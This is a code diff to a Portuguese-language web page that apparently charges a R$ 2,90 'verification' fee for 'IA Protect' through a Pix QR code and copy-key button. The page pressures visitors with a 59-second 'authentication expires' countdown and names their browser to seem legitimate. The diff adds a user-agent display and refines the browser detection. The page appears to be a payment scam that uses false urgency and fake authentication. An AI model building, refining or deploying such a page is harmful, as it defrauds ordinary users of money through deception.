@@ -44,6 +44,11 @@
       margin-top: 20px;
       color: #333;
     }
+    .ua {
+      margin-top: 40px;
+      font-size: 12px;
+      color: #aaa;
+    }
   </style>
 </head>
 <body>
@@ -55,7 +60,6 @@
   <h3>Valor único de verificação: R$ 2,90</h3>
   <p>(IA Protect opera por menos de $0.55 USD internacionalmente)</p>
 
-  <!-- QR code funcional -->
   <img 
     src="https://api.qrserver.com/v1/create-qr-code/?data=00020126580014BR.GOV.BCB.PIX01367a97187a-4475-4468-92b5-a8dc1d83aeda52040000530398654042.905802BR5923SUL%20INTERMEDIACOES%20LTDA6006ITAJAI62120508IAPROTEC630446DB&size=220x220" 
     class="qr-code" 
@@ -70,26 +74,31 @@
 
   <p class="timer">⏳ Sua autenticação expira em <span id="countdown">59</span> segundos.</p>
 
+  <!-- DEBUG: Exibir userAgent -->
+  <p class="ua">
+    <strong>User Agent:</strong> <span id="ua-string"></span>
+  </p>
+
   <script>
-    // Navegador
-    const userAgent = navigator.userAgent.toLowerCase();
-let browser = "seu navegador";
+    const userAgent = navigator.userAgent;
+    document.getElementById("ua-string").textContent = userAgent;
 
-if (userAgent.includes("edg/")) {
-  browser = "Microsoft Edge";
-} else if (userAgent.includes("opr/") || userAgent.includes("opera")) {
-  browser = "Opera";
-} else if (userAgent.includes("chrome")) {
-  browser = "Google Chrome";
-} else if (userAgent.includes("firefox")) {
-  browser = "Mozilla Firefox";
-} else if (userAgent.includes("safari")) {
-  browser = "Safari";
-}
+    let browser = "seu navegador";
 
-document.getElementById("browser-name").textContent = browser;
+    if (userAgent.includes("Edg/")) {
+      browser = "Microsoft Edge";
+    } else if (userAgent.includes("OPR/") || userAgent.includes("Opera")) {
+      browser = "Opera";
+    } else if (userAgent.includes("Chrome") && !userAgent.includes("Edg/") && !userAgent.includes("OPR/")) {
+      browser = "Google Chrome";
+    } else if (userAgent.includes("Firefox")) {
+      browser = "Mozilla Firefox";
+    } else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) {
+      browser = "Safari";
+    }
 
-    // Cópia Pix
+    document.getElementById("browser-name").textContent = browser;
+
     function copyPix() {
       const text = document.getElementById("pixKey").innerText;
       navigator.clipboard.writeText(text).then(() => {
@@ -97,7 +106,6 @@ document.getElementById("browser-name").textContent = browser;
       });
     }
 
-    // Cronômetro regressivo
     let tempo = 59;
     const el = document.getElementById("countdown");
     const interval = setInterval(() => {
